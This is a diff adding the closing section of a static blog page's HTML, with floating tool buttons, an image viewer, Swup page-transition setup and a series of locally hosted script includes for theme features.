+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="right-bottom-tools rss flex justify-center items-center">
+                <a class="flex justify-center items-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                <i class="fa-regular fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="fa-regular fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog"></i>
+        </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
